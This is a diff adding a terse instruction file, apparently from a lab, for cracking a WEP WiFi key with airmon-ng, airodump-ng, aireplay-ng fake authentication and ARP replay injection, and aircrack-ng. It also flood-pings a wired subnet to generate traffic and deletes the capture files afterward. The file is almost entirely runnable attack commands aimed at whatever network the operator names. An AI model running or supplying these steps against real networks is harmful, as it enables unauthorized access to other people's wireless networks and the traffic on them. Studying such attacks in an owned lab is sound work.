@@ -1,0 +1,60 @@
+// WEP Instructions
+
+// Open 4 terminals
+
+// Connect to WiFi interface (wlanN)
+
+Terminal 1: 
+ifconfig
+	// Get the name and mac address of wlan
+int=[name of wlan] // should look similar to wlx00c0ca40b1b8
+		
+Terminal 1, 2, and 3:
+mac=[mac of wlan] //should look similar to 00:c0:ca:40:b1:b8
+
+Terminal 1:
+sudo iwlist $int scan | grep -E '(Address:|Channel:|ESSID:)'
+
+Terminal 1, 2, and 3:
+essid=[name of router] //should look like civilizations
+bssid=[address] // should look like B4:75:0E:DA:A8:B3
+chan=[channel] // should look like 11
+
+Any Terminal:
+sudo stop network-manager
+or
+sudo /etc/init.d/network-manager stop
+
+// if wlan is up
+sudo ifconfig $int down
+
+Terminal 4:
+// connect wired to AP
+sudo ifconfig eno1 up
+sudo dhclient eno1
+
+Terminal 1:
+sudo airmon-ng start $int $chan
+sudo airodump-ng -c $chan --bssid $bssid -w output mon0
+
+Terminal 2:
+sudo aireplay-ng -1 0 -e $essid -a $bssid -h $mac mon0
+sudo aireplay-ng -3 -b $bssid -h $mac mon0 
+	// if deauth/disassoc packet recieved, break and re-authenticate			 
+Terminal 3:
+sudo aircrack-ng -b $bssid output*.cap
+
+Terminal 4:
+for ((i=2; i<255; i+=10)); do sudo ping -f -I eno1 -W 0.01 192.168.1.$i; done
+	// press ctrl+c repeated ro go to the next IP address in the for loop
+	// When successful, press ctrl+c in Terminals 1, 2, 3, and 4
+
+Terminal 1:
+sudo airmon-ng stop mon0
+sudo rm output*
+sudo rm replay*
+	// would help if you unplug WiFi interface if it is USB
+
+
+// Restart network manager instructions
+sudo service network-manager start
